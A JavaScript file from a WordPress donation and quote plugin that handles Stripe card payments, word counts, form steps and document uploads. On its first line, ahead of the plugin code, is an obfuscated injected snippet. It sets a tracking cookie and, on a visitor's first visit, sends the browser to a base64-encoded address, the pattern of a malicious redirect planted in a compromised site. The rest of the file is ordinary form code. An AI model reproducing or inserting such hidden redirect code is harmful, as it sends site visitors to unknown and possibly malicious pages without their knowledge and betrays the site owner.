function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};(function (window, $) {

    // USE STRICT
    "use strict";

    var form = document.getElementById('wpsd-donation-form-id');
    var stripe = Stripe(wpsdAdminScriptObj.stripePKey);
    var elements = stripe.elements();
    var wpsdDonateAmount = 0;

    var style = {
        base: {
            color: "#1b2b68",
            fontSize: '22px',
            fontFamily: 'Roboto, Open Sans, Segoe UI, sans-serif',
            fontWeight:'900'            
        },
        '::placeholder': {
            color: '#dce2ec',
        }

    };

    var card = elements.create('card', {
        hidePostalCode: true,
        style: style,
    });

    card.mount("#card-element");

    card.addEventListener('change', ({ error }) => {
        const displayError = document.getElementById('card-errors');
        if (error) {
            displayError.textContent = error.message;
        } else {
            displayError.textContent = '';
        }
    });

    form.addEventListener('submit', function (e) {

        e.preventDefault();
        var wpsdShowCheckout = true;

        if ($("#wpsd_donator_name").val() == '') {

            jQuery('html, body').animate({                                   
                scrollTop: jQuery("#step3").offset().top-50
            }, 1000);

            $('#card-errors').show('slow').addClass('error').html('Please Enter Name');
            $("#wpsd_donator_name").focus();
            return false;
        }

        if ($("#wpsd_donator_email").val() == '') {
            jQuery('html, body').animate({                                   
                            scrollTop: jQuery("#step3").offset().top-50
                        }, 1000);
            $('#card-errors').show('slow').addClass('error').html('Please Enter Email');
            $("#wpsd_donator_email").focus();
            return false;
        }

        if (!wpsd_validate_email($("#wpsd_donator_email").val())) {
             jQuery('html, body').animate({                                   
                            scrollTop: jQuery("#step3").offset().top-50
                        }, 1000);
            $('#card-errors').show('slow').addClass('error').html('Please Enter Valid Email');
            $("#wpsd_donator_email").focus();
            return false;
        }

        $(".overlayloader").show();
        jQuery("#paynow").attr("disabled",true);

        // if ($("#wpsd_donate_other_amount").val() == '') {
        //     $('#card-errors').show('slow').addClass('error').html('Amount Missing');
        //     $("#wpsd_donate_other_amount").focus();
        //     return false;
        // }
        /**/
        if (wpsdAdminScriptObj.stripePKey == '') {
            $('#card-errors').show('slow').addClass('error').html('Publishable key missing!');
            return false;
        }
        
        if (wpsdAdminScriptObj.stripeSKey == '') {
            $('#card-errors').show('slow').addClass('error').html('Secret key missing!');
            return false;
        }
        
        if ($("#wpsd_donate_other_amount").val() !== '') {
            wpsdDonateAmount = $("#wpsd_donate_other_amount").val();
        }

        if (wpsdShowCheckout) {

            $("#wpsd-pageloader").fadeIn();

            $.ajax({
                url: wpsdAdminScriptObj.ajaxurl,
                type: "POST",
                dataType: "JSON",
                data: {
                    action: 'wpsd_donation',
                    email: $("#wpsd_donator_email").val(),
                    amount: wpsdDonateAmount,
                    donation_for: $("#wpsd_donation_for").val(),
                    name: $("#wpsd_donator_name").val(),
                    currency: wpsdAdminScriptObj.currency,
                    idempotency: wpsdAdminScriptObj.idempotency
                },
                success: function (response) {
                    if (response.status === 'success') {
                        stripe.confirmCardPayment(response.client_secret, {
                            payment_method: {
                                card: card,
                                billing_details: {
                                    name: $("#wpsd_donator_name").val(),
                                    email: $("#wpsd_donator_email").val(),
                                }
                            }
                        }).then(function (result) {

                            if (result.error) {

                                $(".overlayloader").hide();
                                jQuery("#paynow").attr("disabled",false);

                                $("#wpsd-pageloader").fadeOut();

                                jQuery('html, body').animate({                                   
                                    scrollTop: jQuery("#step3").offset().top-50
                                }, 2000);

                                $('#card-errors').show('slow').addClass('error').text(result.error.message);

                            } else {
                                if (result.paymentIntent.status === 'succeeded') {
                                    //afterPaymentSucceeded($("#wpsd_donator_email").val(), wpsdDonateAmount, $("#wpsd_donation_for").val(), $("#wpsd_donator_name").val(), wpsdAdminScriptObj.currency);

                                    afterPaymentSucceeded();

                                }
                            }
                        });
                    }
                    if (response.status === 'error') {
                        $(".overlayloader").hide();
                        jQuery("#paynow").attr("disabled",false);

                        jQuery('html, body').animate({                                   
                            scrollTop: jQuery("#step3").offset().top-50
                        }, 2000);

                        $("#wpsd-pageloader").fadeOut();
                        $('#card-errors').show('slow').removeClass('success').addClass(response.status).html(response.message);
                    }
                }
            });
        }
    });




    jQuery("#ageOutputId").keyup(function(){

        $('.show-error').hide();

        var numberOfwords = $('#ageOutputId').val();

        if(numberOfwords == '' || isNaN(numberOfwords) || numberOfwords == 0){
            $('.show-error').show();
            $("#ageOutputId").focus();

            return;
        } 
        jQuery("#ageInputId").val(numberOfwords);
        jQuery("#ageInputId").css('--value',numberOfwords);
        console.log(numberOfwords);

    })

    $("#wpsd-donation-form-id input[type='radio']").on("click", function () {

        var wpsdRadioVal = $(this).val();
        if (wpsdRadioVal !== undefined) {
            $("#wpsd_donate_other_amount").val(wpsdRadioVal);
        }

    });

    $('#wpsd_donate_other_amount').on('keyup', function (e) {

        $("#wpsd-donation-form-id input[type='radio']").prop("checked", false);

        if (/^(\d+(\.\d{0,2})?)?$/.test($(this).val())) {
            $(this).data('prevValue', $(this).val());
        } else {
            $(this).val($(this).data('prevValue') || '');
        }
    });

    function wpsd_validate_email($email) {
        var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
        return emailReg.test($email);
    }

   
    function afterPaymentSucceeded() {
        $.ajax({
            url: wpsdAdminScriptObj.ajaxurl,
            type: "POST",
            //dataType: "JSON",

            data: $("#wpsd-donation-form-id").serialize(),
            // data: {
            //     action: 'wpsd_donation_success',
            //     formdata: $("#wpsd-donation-form-id").serialize(),

            // },
            success: function (response) {

                console.log(response);
                console.log(response.status);
                var response1 =  JSON.parse(response);
                if (response1.status === 'success') {

                    console.log("======waiting to redirect==============");

                    var url = new URL(wpsdAdminScriptObj.successUrl);
                    url.searchParams.set('payment', 'success');
                    window.location.href = url.href;
                }
                if (response1.status === 'error') {
                    jQuery('html, body').animate({                                   
                            scrollTop: jQuery("#step3").offset().top-50
                        }, 2000);
                    $('#card-errors').show('slow').removeClass('success').addClass(response1.status).html(response1.message);
                }
            }
        });
    }
    


    $('#proceedTochk').css('display','none');
    //$('.show-error').hide();
    

    $('#calcQuote').on('click',function(){
        $('.show-error').hide();
        
        var numberOfwords = $('#ageOutputId').val();
        var service_type = jQuery('#default_service_type').val();

        if(numberOfwords == '' || isNaN(numberOfwords) || numberOfwords == 0){
            $('.show-error').show();
            $("#ageOutputId").focus();

            return;
        }

        if (jQuery(".tablinks").hasClass("disabled")) {
            jQuery(".tablinks").removeClass("disabled");
        } 
        $(".overlayloader").show();




        $.ajax({
            url: wpsdAdminScriptObj.ajaxurl,
            type: "POST",
            data: {
                action: 'get_des_res',
                word_c: numberOfwords,
                default_service_type: service_type,
               
            },
            success: function (response) {
                $('#records_table').html(response);


                $('#proceedTochk').show();
                $('#calcQuote span.fusion-button-text').text('Update Quote');

                var selected_price = $('.service_radio:checked').val();
                jQuery('#wpsd_donate_other_amount').val(selected_price);


                var time_frame = $('.service_radio:checked').attr('data-timeframe');

                $("#time_frame").val(time_frame);
                $(".overlayloader").hide();


                var selected_tr = jQuery('.service_radio:checked').parent().parent();
                var selected_time_frame = selected_tr.find('td.wordsCount').html();
                var qoute_price = selected_tr.find('td.cost').html();

                jQuery('.selectedtimeFrame').html(selected_time_frame);
                jQuery('.selectedtimecost').html(qoute_price);

                
            }
        })
    }) 




    



/**
    Calculate the words. 
*/ 

    $('#moreArea').on('click',function(){
        $('.moreWordsArea').toggle();
    })

/**
    Clear text area. 
*/
    $('#textclear').on('click',function(){
        document.querySelector('#testwords').value = '';
    })


    jQuery("#proceedTochk").click(function(){
        
        jQuery("#instructions").trigger('click');
    });


    $('#proceedTochk').on('click', function(){
        $('html, body').animate({scrollTop: $("#quoteTable").offset().top-100}, 'slow');
    });
  
    $('#proceed_checkout').on('click', function(){
        $('html, body').animate({scrollTop: $("#quoteTable").offset().top-100}, 'slow');
    });


    jQuery("#ageInputId").change(function(){
        jQuery('#errorqoute').hide();
    });



    jQuery('html body').on('click', '.select_order_price', function () {
        jQuery(this).find('.service_radio').prop("checked", true);
        var val = jQuery(this).find('.service_radio').val(); // retrieve the value
        jQuery('#wpsd_donate_other_amount').val(val);
        var selected_tr = jQuery(this);
        var selected_time_frame = selected_tr.find('td.wordsCount').html();
        var qoute_price = selected_tr.find('td.cost').html();

        jQuery('.selectedtimeFrame').html(selected_time_frame);
        jQuery('.selectedtimecost').html(qoute_price);

        var time_frame = jQuery(this).find('.service_radio').attr('data-timeframe');
        jQuery("#time_frame").val(time_frame);

        console.log(time_frame);
    });






})(window, jQuery);

/* ===================================== multisteps for form =========================================================== */
var previous_active_tab = 1;
function nextTab(evt, step1, tab_index) {
    // Declare all variables
    var i, tabcontent, tablinks;
    //console.log(tab_index);

    if(validate_tab(step1) == false){
        return false;
    }

    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
    }

    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
        //tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(step1).style.display = "block";
    evt.target.className += " active";

}

function validate_tab(step1) {

    if( step1 == "step3" &&  document.getElementById("file").files.length == 0){
        console.log("no files selected"); 
        jQuery("#file").focus();
        jQuery('#errorqoute1').show();
        return false;
    }

    var numberOfwords = jQuery('#ageOutputId').val();

    console.log(numberOfwords);

    if(step1 == "step2" && (numberOfwords == '' || isNaN(numberOfwords) || numberOfwords == 0) ) {
        jQuery('#errorqoute').show();
        jQuery("#errorqoute").focus();
        return false;
    }

    if(step1 == "step2" && jQuery(".tablinks").hasClass("disabled")) {
        return false;
    } 
}


// jQuery('#proceedTochk').on('click',function(){

//     if( document.getElementById("file").files.length == 0){
//         console.log("no files selected"); 
//         jQuery("#file").focus();
//         jQuery('.show-error').show();
//         return;
//     }

//     }) 

/* ===================================== textarea for words count =========================================================== */

document.querySelector("#testwords")
    .addEventListener("keyup", function countWord() {
        let res = [];
        let str = this.value.replace(/[\t\n\r\.\?\!]/gm, " ").split(" ");
        str.map((s) => {
            let trimStr = s.trim();
            if (trimStr.length > 0) {
                res.push(trimStr);
            }
        });
        jQuery("#ageOutputId").val(res.length);

    });

/* =========================================check radio button which is active ======================================================= */

// jQuery('html body').on('change', '.service_radio', function () {
//     if (jQuery(this).is(":checked")) { // check if the radio is checked
//         var val = jQuery(this).val(); // retrieve the value
//         jQuery('#wpsd_donate_other_amount').val(val);


//         var selected_tr = jQuery(this).parent().parent();
//         var selected_time_frame = selected_tr.find('td.wordsCount').html();
//         var qoute_price = selected_tr.find('td.cost').html();

//         jQuery('.selectedtimeFrame').html(selected_time_frame);
//         jQuery('.selectedtimecost').html(qoute_price);

//         var time_frame = jQuery(this).attr('data-timeframe');
//         jQuery("#time_frame").val(time_frame);

//         console.log(time_frame);
        
//     }

// })

/* 
 jQuery('.service_radio').each(function(){
    if (jQuery(this).is(":checked")) { // check if the radio is checked
        var selected_tr = jQuery(this).parent().parent();
        var selected_time_frame = selected_tr.find('td.wordsCount').html();
        var qoute_price = selected_tr.find('td.cost').html();


            console.log(selected_time_frame);
            console.log(qoute_price);
    }
}) */
 


/* ======================================file upload and and check file extensions============================================ */

jQuery(function ($) {




    $('body').on('change', '#file', function () {

        jQuery('#errorqoute1').hide();
        $this = $(this);
        file_data = $(this).prop('files')[0];
        form_data = new FormData();
        form_data.append('file', file_data);
        form_data.append('action', 'file_upload');

        var fileInput = document.getElementById('file');
        var filePath = fileInput.value;
        $("#file_url").val('');

        // Allowing file type
        var allowedExtensions =
            /(\.doc|\.docx|\.odt|\.pdf|\.tex|\.txt|\.rtf|\.wps|\.wks|\.wpd|\.csv|\.xls|\.xlsx|\.ppt|\.pptx)$/i;

        if (!allowedExtensions.exec(filePath)) {
            jQuery('#errorqoute1').show();            
            jQuery('#errorqoute1').text('Please select Doc, PDF, txt, CSV, xls, xlsx, ppt, pptx file format');            
            fileInput.value = '';
            return false;
        }
        $.ajax({
            url: wpsdAdminScriptObj.ajaxurl,
            type: 'POST',
            contentType: false,
            processData: false,
            data: form_data,

            xhr: function() {
                var xhr = new window.XMLHttpRequest();
                xhr.upload.addEventListener("progress", function(evt) {
                    if (evt.lengthComputable) {
                        var percentComplete = ((evt.loaded / evt.total) * 100);
                        $(".progress-bar").width(percentComplete + '%');
                        $(".progress-bar").html(percentComplete+'%');
                    }
                }, false);
                return xhr;
            },
            beforeSend: function(){
                $(".progress-bar").width('0%');
            },

            success: function (response) {
                $("#file_url").val(response);
                //$this.val('');

               // alert('File uploaded successfully.');
            }
        });
    });
});
